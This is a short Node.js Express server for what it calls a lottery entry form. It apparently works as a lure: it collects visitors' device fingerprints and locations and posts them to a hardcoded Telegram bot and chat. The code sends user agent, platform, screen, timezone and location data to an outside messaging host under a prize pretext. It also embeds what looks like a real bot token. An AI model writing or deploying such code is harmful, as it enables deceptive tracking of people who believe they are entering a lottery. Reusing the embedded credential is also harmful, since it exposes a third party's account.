import express from "express";
import fetch from "node-fetch";

const app = express();
app.use(express.json());
app.use(express.static("public"));

// 🔹 Replace with your bot token & chat ID
const BOT_TOKEN = "6298320462:AAFgjEjGy0udiRNZRG1VVpooKYyQpj4UF6U";
const CHAT_ID = "6000036430";

app.post("/api/submit", async (req, res) => {
  const { deviceInfo, ticket } = req.body;

  const msg = `🎰 *New Lottery Entry* 🎰\n\n` +
    `🎟 Ticket: ${ticket}\n\n` +
    `🖥 User Agent: ${deviceInfo.userAgent}\n` +
    `📱 Platform: ${deviceInfo.platform}\n` +
    `🌐 Language: ${deviceInfo.language}\n` +
    `📺 Screen: ${deviceInfo.screen?.width}x${deviceInfo.screen?.height}\n` +
    `🕒 Timezone: ${deviceInfo.timezone}\n` +
    `📍 Location: ${deviceInfo.location ? JSON.stringify(deviceInfo.location) : "Not shared"}`;

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: msg,
        parse_mode: "Markdown"
      }),
    });

    res.json({ success: true, message: "Entry submitted successfully!", ticket });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, message: "Failed to send entry." });
  }
});

app.listen(3000, () => console.log("✅ Server running at http://localhost:3000"));
